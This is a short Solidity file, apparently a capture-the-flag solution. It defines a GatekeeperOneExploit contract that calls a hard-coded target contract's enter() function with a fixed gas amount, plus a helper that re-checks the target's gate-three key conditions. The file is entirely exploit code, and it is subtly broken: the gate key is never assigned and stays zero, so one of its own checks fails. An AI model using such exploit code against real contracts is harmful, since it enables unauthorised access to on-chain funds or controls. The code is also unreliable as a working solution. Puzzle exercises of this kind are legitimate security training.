// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneExploit {
    IGatekeeperOne public constant TARGET =
        IGatekeeperOne(0x058B16339ffd0953c37065747318E1dB7b09Eca6);

    function execute() external {
        bytes8 _gateKey;
        TARGET.enter{gas: 508098}(_gateKey);
    }

    function isKeyValid() external view returns (bool isValid) {
        bytes8 _gateKey;

        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        isValid = true;
    }
}

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}
